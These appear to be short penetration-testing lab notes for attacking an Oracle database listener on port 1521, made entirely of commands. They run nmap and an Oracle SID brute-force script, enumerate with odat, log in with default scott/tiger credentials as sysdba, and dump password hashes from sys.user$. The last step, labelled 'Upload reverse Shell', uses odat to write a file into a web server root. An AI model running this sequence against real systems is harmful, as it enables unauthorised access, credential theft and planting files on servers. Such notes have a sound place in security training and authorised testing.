Port: 1521

nmap default scan:

```shell
sudo nmap -p1521 -sV 10.129.204.235 --open
```

nmap sid brute force:

```shell
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

Scan DB (odat):

```shell
./odat.py all -s 10.129.204.235
```

SQL login:

```shell
sqlplus scott/tiger@10.129.204.235/XE

sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

Extract user creds:

```shell
select name, password from sys.user$;
```

Upload reverse Shell:

```shell
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
